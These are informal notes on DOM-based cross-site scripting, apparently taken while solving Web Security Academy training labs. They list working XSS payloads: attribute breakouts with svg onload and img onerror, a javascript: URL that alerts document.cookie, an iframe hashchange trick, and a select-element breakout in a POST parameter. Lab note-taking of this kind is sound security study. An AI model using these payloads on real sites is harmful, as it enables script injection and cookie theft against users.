
[ WEB > XSS > DOM ]

// test input then inspect element.
// e.g., in search. search for test123
// you'll notice the text gets put in an img src tag:
// <img src="/resources/images/tracker.gif?searchTerms=test123" rcivhjt7x="">

// b-b-b-break out of the attribute... (yes, I've had lots of coffee right now...)
"><svg onload=alert(1)>

===

// code allows injection of html
// like freakin geniuses, we trigger an error then handle it in the same tag...
<img src=1 onerror=alert(1)>

===

// e.g., feedback form url contains:
// https://0ac400f60339e68c8218abfa00e90020.web-security-academy.net/feedback?returnPath=/
// modify the param to unique text to search for injection vulns.
// https://0ac400f60339e68c8218abfa00e90020.web-security-academy.net/feedback?returnPath=/test123
// note that a "back" link has this text now: <a id="backLink" href="/test123">Back</a>
// let's inject!
https://0ac400f60339e68c8218abfa00e90020.web-security-academy.net/feedback
?returnPath=javascript:alert(document.cookie)

===

// redirect user to website, then perform xss
// in this case, the payload attempts to print the webpage on the user's computer...
<iframe src="https://0a37009f040876fb8054089800590050.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>

===

// post request includes vulnerable param
productId=1&storeId=London

// modify storeId param:
productId=1&storeId=London"></select><img%20src=1%20onerror=alert(1)>



